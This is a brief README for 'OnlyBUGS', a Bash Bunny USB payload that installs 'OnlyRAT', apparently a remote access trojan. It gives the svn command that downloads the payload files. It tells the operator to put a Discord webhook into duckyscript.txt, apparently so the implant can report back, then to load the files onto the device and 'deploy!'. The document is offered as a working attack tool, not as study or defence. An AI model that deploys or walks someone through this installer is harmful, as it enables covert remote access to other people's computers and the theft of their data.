## OnlyBUGS
This is an installer for OnlyRAT that uses the [Bash Bunny](https://shop.hak5.org/products/bash-bunny).

## Download:
```bash
svn checkout https://github.com/CosmodiumCS/payloads/trunk/bashbunny/OnlyBUGS
```

## Instructions:
1. in line 18 of `duckyscript.txt`, repalce `DISCORDWEBHOOK` with your discord webhook
```
STRING echo DISCORDWEBHOOK > lawFvVTikZ.txt
```
2. add `payload.txt` and `duckyscript.txt` to a switch position on your BashBunny
3. deploy!
